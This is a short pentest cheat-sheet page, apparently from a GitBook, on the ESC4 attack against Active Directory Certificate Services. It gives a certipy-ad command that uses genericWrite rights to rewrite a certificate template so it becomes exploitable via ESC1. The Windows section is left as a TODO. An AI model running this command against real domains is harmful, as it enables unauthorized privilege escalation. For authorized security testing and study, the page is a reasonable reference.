# ESC4

Thanks to the genericWrite permission, we can modify our template to make it vulnerable to ESC1.

{% tabs %}
{% tab title="Linux" %}
Make the template vulnerable

{% code overflow="wrap" %}
```bash
certipy-ad template -u <User>@<Domain> -p '<PASS>' -template <Template Name> -save-old -debug
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/Pasted image 20230828151521.png" alt=""><figcaption></figcaption></figure>

Next use [esc1.md](esc1.md "mention") to exploit it
{% endtab %}

{% tab title="Windows" %}
//TODO
{% endtab %}
{% endtabs %}
